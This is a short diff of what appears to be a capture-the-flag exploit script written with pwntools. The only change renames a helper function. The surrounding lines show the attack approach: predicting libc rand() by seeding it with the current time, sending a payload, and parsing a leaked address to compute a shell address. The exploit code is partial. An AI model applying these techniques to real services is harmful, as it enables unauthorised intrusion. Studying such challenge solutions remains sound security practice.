@@ -15,7 +15,7 @@ proc = CDLL("libc.so.6")
 proc.srand(proc.time(0))
 log.info('seed: %#x' % proc.time(0))
 
-def getInfo():
+def INFO():
 	global MANA,HP,BOSS
 	r.recvuntil("| Your MANA: ")
 	MANA = int(r.recvuntil("\n"))
@@ -29,12 +29,12 @@ def attack(c):
 	r.sendline(str(c))
 	r.recvuntil(">> ")
 	r.sendline(str(9))
-	getInfo()
+	INFO()
 	
 def defense(c):
 	r.recvuntil(">> ")
 	r.sendline(str(c))
-	getInfo()
+	INFO()
 	
 def skill(n):
 	s = int(n /0xBADC0DE)
@@ -44,7 +44,7 @@ def skill(n):
 		s = 5
 	r.recvuntil(">> ")
 	r.sendline(str(s))
-	getInfo()
+	INFO()
 	
 def play():
 	while 1:
@@ -72,7 +72,7 @@ r.sendline(payload)
 r.recvuntil("leak:")
 shell_addr = int(r.recv(10),16)-0x66
 log.info("shell_addr: %#x",shell_addr)
-getInfo()
+INFO()
 defense((proc.rand()%3)+1)
 if MANA >= 0x175b81bc:
 	skill(MANA)
